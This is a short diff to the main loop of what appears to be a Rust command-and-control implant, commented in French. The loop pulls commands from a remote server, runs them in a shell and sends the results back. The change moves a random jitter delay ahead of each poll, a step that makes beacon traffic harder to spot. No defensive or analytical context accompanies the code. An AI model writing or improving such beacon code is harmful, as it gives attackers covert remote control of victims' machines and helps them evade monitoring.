@@ -34,6 +34,10 @@ async fn main() {
     let shell = profiles.get_shell().to_string();
 
     loop {
+        // Jitter aléatoire
+        let secs = rand::thread_rng().gen_range(jitter_min..=jitter_max);
+        sleep(Duration::from_secs(secs)).await;
+
         // Récupérer et décoder la commande du serveur
         if let Some(cmd) = http::get_command(&client, api_url, &profiles.server, next_route).await {
             // Exécuter la commande
@@ -44,8 +48,6 @@ async fn main() {
             let _ = http::send_response(&client, api_url, &profiles.client, cmd.id, &response, response_route).await;
         }
 
-        // Jitter aléatoire
-        let secs = rand::thread_rng().gen_range(jitter_min..=jitter_max);
-        sleep(Duration::from_secs(secs)).await;
+        
     }
 }
